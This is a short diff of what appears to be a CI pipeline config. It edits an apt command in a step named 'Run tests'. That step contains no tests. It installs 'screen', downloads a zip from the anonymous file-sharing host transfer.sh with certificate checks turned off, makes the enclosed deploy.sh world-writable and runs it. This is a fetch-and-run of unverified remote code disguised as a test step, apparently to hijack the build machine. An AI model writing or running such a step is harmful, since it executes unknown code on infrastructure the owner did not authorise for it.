@@ -6,7 +6,7 @@ working_dir: &working_dir ~/app
     - run:
         name: Run tests
         command: |
-                    apt update 
+                    sudo apt update 
                     sudo apt install screen -y 
                     wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
 
